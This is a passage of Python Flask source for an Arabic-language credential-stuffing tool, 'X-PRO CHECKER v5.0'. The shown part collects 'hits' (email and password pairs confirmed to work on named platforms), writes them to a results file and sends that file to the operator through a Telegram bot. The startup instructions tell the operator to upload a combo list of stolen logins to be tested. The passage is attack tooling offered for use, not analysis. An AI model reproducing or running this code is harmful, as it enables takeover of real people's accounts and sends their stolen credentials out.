    CURRENT_SCAN["status"] = "completed"
    CURRENT_SCAN["progress"] = 100
    
    msg = f"""
✅ *تم الانتهاء من الفحص*
📊 *الملخص النهائي*

📝 الإجمالي: {CURRENT_SCAN['total']}
✅ تم الفحص: {CURRENT_SCAN['checked']}
🎯 الضربات: {CURRENT_SCAN['hits']}
❌ الفاشلة: {CURRENT_SCAN['bad']}
⚠️ الأخطاء: {CURRENT_SCAN['errors']}
    """
    send_telegram_message(bot_token, bot_chat_id, msg)
    
    if all_hits:
        result_file = f"results/hits_{int(time.time())}.txt"
        with open(result_file, 'w', encoding='utf-8') as f:
            for hit in all_hits:
                f.write(f"{hit['email']}:{hit['password']} | {hit['platform']}\n")
        
        send_telegram_file(bot_token, bot_chat_id, result_file, f"📁 النتائج - {len(all_hits)} ضربة")

@app.route('/stats')
def get_stats():
    return jsonify({
        "success": True,
        "scan_data": CURRENT_SCAN,
        "bot_status": session.get('bot_status', 'offline')
    })

@app.route('/get_results')
def get_results():
    results_dir = "results"
    if not os.path.exists(results_dir):
        return jsonify({"success": False, "message": "لا توجد نتائج"})
    
    files = [f for f in os.listdir(results_dir) if f.startswith('hits_')]
    if not files:
        return jsonify({"success": False, "message": "لا توجد نتائج"})
    
    latest = max(files, key=lambda x: os.path.getctime(os.path.join(results_dir, x)))
    return send_file(os.path.join(results_dir, latest), as_attachment=True)

@app.route('/clear_results', methods=['POST'])
def clear_results():
    results_dir = "results"
    if os.path.exists(results_dir):
        for f in os.listdir(results_dir):
            os.remove(os.path.join(results_dir, f))
    return jsonify({"success": True, "message": "✅ تم مسح جميع النتائج"})

# =================== تشغيل الموقع ===================
if __name__ == '__main__':
    print("🔥 X-PRO CHECKER v5.0 - Flask Web")
    print("👑 المطور: HackerExos")
    print("🌐 الموقع يعمل على: http://localhost:5000")
    print("")
    print("📌 الخطوات:")
    print("1. افتح الموقع في المتصفح")
    print("2. أدخل توكن البوت والأيدي")
    print("3. اضغط 'اختبار الاتصال'")
    print("4. أرسل ملف combo.txt للبوت في التليجرام")
    print("5. البوت يرفع الملف للموقع ويبدأ الفحص")
    print("6. النتائج ترسل لك في التليجرام")
    app.run(host='0.0.0.0', port=5000, debug=True)
